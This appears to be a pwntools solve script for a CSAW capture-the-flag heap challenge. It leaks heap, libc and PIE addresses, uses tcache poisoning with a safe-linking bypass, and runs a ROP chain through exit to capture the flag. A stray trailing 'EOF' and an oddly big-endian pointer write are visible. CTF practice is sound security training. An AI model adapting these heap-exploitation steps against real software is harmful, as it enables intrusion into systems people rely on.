from pwn import *
import sys, re

context.arch='amd64'; context.log_level='warn'
exe='/home/ctfplayer/workspace/chal'
libc=ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf=ELF(exe, checksec=False)

MAIN=0x1229
GADGET=0x1954           # mov [rbp-0x50],8 ; jmp 0x197d (clears [rbp-0x40])
RET=0x101a
EXIT_PLT=0x1130+6       # endbr64; jmp [exit@got]  -> rax=0 at call time

def start():
    if len(sys.argv)>1 and sys.argv[1]=='r':
        return remote('pwn.chal.csaw.io',21001)
    return process(exe)

def menu(p,n):
    p.recvuntil(b'6. Detonate Bomb\n')
    p.send(str(n).encode()+b'\n')

def build(p,pos,size):
    menu(p,1); p.recvuntil(b'position: '); p.send(str(pos).encode()+b'\n')
    p.recvuntil(b'capacity of: '); p.send(str(size).encode()+b'\n')

def launch(p,pos):
    menu(p,2); p.recvuntil(b'position: '); p.send(str(pos).encode()+b'\n')

def load(p,pos,data):
    menu(p,3); p.recvuntil(b'position: '); p.send(str(pos).encode()+b'\n')
    p.recvuntil(b'ammo of: '); p.send(data)

def check(p,pos,n):
    menu(p,4); p.recvuntil(b'position: '); p.send(str(pos).encode()+b'\n')
    return p.recvn(n)

def upgrade(p,val):
    menu(p,5); p.recvuntil(b'resource: '); p.send(val)

p=start()

# A) slot0 = tcache_perthread_struct
build(p,0,0)
heapbase=u64(check(p,0,8))-0x10
log.warn('heap base = '+hex(heapbase))

# B) unsorted leak
build(p,1,0x418); build(p,2,0x418)
launch(p,1)
l=u64(check(p,1,8))
libc.address=l-(libc.symbols['main_arena']+96)
log.warn('libc base = '+hex(libc.address))

# C) tcache poisoning -> bss+0x30
build(p,3,0x208); build(p,4,0x208)
launch(p,3); launch(p,4)
leak=u64(check(p,4,8))
heapkey=leak>>12
target=heapbase+0x730          # bss+0x30
nextfield=(target^heapkey).to_bytes(8,'big')
load(p,4,nextfield)
build(p,5,0x208); build(p,6,0x208)
pie=u64(check(p,6,8))
elf.address=pie-MAIN
log.warn('pie base = '+hex(elf.address))

# E) bonus=8
load(p,4,p64(elf.address+GADGET)+b'\x00'*0x208)
check(p,15,1)

# F) free tcache_perthread_struct -> free_all
launch(p,0)

# G) malloc returns main+0x1000 (unsorted head), write ROP
rop=flat(elf.address+RET, elf.address+GADGET, elf.address+EXIT_PLT)
payload=rop+b'\x00'*(0x508-len(rop))
build(p,0,0x500); load(p,0,payload)

# H) exit -> ROP
menu(p,6)
p.recvuntil(b'choice!\n')
r=p.recvall(timeout=5)
print(hexdump(r[:0x40]))
m=re.search(rb'csawctf\{[^}]*\}',r)
if m: log.success(m.group(0).decode())
else: log.warn('no flag; got %d bytes'%len(r))
EOF
